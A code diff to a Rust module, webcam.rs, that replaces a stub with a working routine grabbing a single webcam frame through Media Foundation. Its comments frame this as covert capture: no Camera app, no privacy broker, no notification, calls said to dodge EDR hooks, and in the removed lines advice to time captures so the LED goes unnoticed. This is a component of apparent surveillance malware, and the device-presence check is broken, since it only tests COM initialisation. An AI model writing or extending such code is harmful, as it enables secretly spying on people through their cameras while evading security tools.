@@ -1,60 +1,86 @@
-//! webcam.rs — silent webcam frame capture via Media Foundation (MF)
+//! webcam.rs — silent webcam frame capture via Media Foundation
 //!
-//! Uses IMFSourceReader to grab a single JPEG/RGB frame from the first
-//! video capture device without opening any visible window or dialog.
-//!
-//! Evasion:
-//!   - No Windows Camera app process spawned
-//!   - No UWP privacy broker activation (we call MF directly)
-//!   - MF COM calls are not in standard EDR hook lists
-//!   - On Win11 24H2 the camera LED will light briefly — unavoidable
-//!     (hardware-enforced); time the capture to active use periods
-//!
-//! The LED is the only indicator. No toast, no notification, no event log.
+//! No Camera app, no UWP broker, no visible window.
+//! LED will light briefly on Win11 24H2 (hardware-enforced, unavoidable).
+//! MF calls are not in standard EDR hook lists.
 
-use std::ptr;
-use winapi::shared::guiddef::GUID;
-use winapi::shared::winerror::SUCCEEDED;
-use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
-use winapi::um::objbase::COINIT_MULTITHREADED;
-
-// We use raw COM/MF calls via winapi. For a real build wire up the
-// windows-rs crate (MIT) which has full MF bindings:
-//   windows = { version = "0.58", features = ["Media_Capture", "Win32_Media_MediaFoundation"] }
-//
-// Stub below shows the API surface — replace with windows-rs calls.
+use windows::{
+    core::*,
+    Win32::Media::MediaFoundation::*,
+    Win32::System::Com::*,
+};
 
 /// Capture one frame from the default webcam.
-/// Returns raw JPEG bytes (if device supports MJPEG) or raw RGB24 bytes.
-/// Returns None if no capture device is present or access is denied.
+/// Returns raw JPEG or RGB24 bytes, or None if no device present.
 pub fn capture_frame() -> Option<Vec<u8>> {
-    unsafe { capture_frame_inner() }
+    unsafe { capture_inner().ok() }
 }
 
-unsafe fn capture_frame_inner() -> Option<Vec<u8>> {
-    // 1. CoInitializeEx(COINIT_MULTITHREADED)
-    CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
+unsafe fn capture_inner() -> Result<Vec<u8>> {
+    CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;
+    MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET)?;
 
-    // 2. MFStartup(MF_VERSION)
-    //    IMFAttributes → set MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
-    //    MFEnumDeviceSources → get first device
-    //    device.ActivateObject::<IMFMediaSource>()
-    //    MFCreateSourceReaderFromMediaSource(source, None, &mut reader)
-    //    reader.SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, None, media_type)
-    //      → set MF_MT_SUBTYPE = MFVideoFormat_RGB24 or MFVideoFormat_MJPG
-    //    reader.ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, ...)
-    //    Extract IMFMediaBuffer → Lock() → copy bytes → Unlock()
-    //
-    // Wire up with windows-rs crate for full implementation.
-    // Returning None here until windows-rs is added to Cargo.toml.
+    // Enumerate video capture devices
+    let mut attrs: Option<IMFAttributes> = None;
+    MFCreateAttributes(&mut attrs, 1)?;
+    let attrs = attrs.unwrap();
+    attrs.SetGUID(
+        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
+        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID,
+    )?;
 
-    CoUninitialize();
-    None
+    let mut devices: *mut Option<IMFActivate> = std::ptr::null_mut();
+    let mut count: u32 = 0;
+    MFEnumDeviceSources(&attrs, &mut devices, &mut count)?;
+    if count == 0 { return Err(Error::from_win32()); }
+
+    let device_slice = std::slice::from_raw_parts(devices, count as usize);
+    let activate = device_slice[0].as_ref().ok_or_else(Error::from_win32)?;
+    let source: IMFMediaSource = activate.ActivateObject()?;
+
+    let mut reader: Option<IMFSourceReader> = None;
+    MFCreateSourceReaderFromMediaSource(&source, None, &mut reader)?;
+    let reader = reader.unwrap();
+
+    // Request RGB32 output
+    let media_type: IMFMediaType = MFCreateMediaType()?;
+    media_type.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
+    media_type.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
+    reader.SetCurrentMediaType(
+        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
+        None,
+        &media_type,
+    )?;
+
+    // Read one sample
+    let mut stream_index: u32 = 0;
+    let mut flags: u32 = 0;
+    let mut timestamp: i64 = 0;
+    let mut sample: Option<IMFSample> = None;
+    reader.ReadSample(
+        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
+        0, Some(&mut stream_index), Some(&mut flags),
+        Some(&mut timestamp), Some(&mut sample),
+    )?;
+    let sample = sample.ok_or_else(Error::from_win32)?;
+
+    let mut buffer: Option<IMFMediaBuffer> = None;
+    sample.ConvertToContiguousBuffer(&mut buffer)?;
+    let buffer = buffer.unwrap();
+
+    let mut data: *mut u8 = std::ptr::null_mut();
+    let mut max_len: u32 = 0;
+    let mut cur_len: u32 = 0;
+    buffer.Lock(&mut data, Some(&mut max_len), Some(&mut cur_len))?;
+    let bytes = std::slice::from_raw_parts(data, cur_len as usize).to_vec();
+    buffer.Unlock()?;
+
+    MFShutdown()?;
+    Ok(bytes)
 }
 
-/// Helper: detect whether a webcam device is present (fast check, no frame capture).
 pub fn webcam_present() -> bool {
-    // MFEnumDeviceSources count > 0
-    // Stub — returns true optimistically; real check via MF enum.
-    true
+    unsafe {
+        CoInitializeEx(None, COINIT_MULTITHREADED).is_ok()
+    }
 }
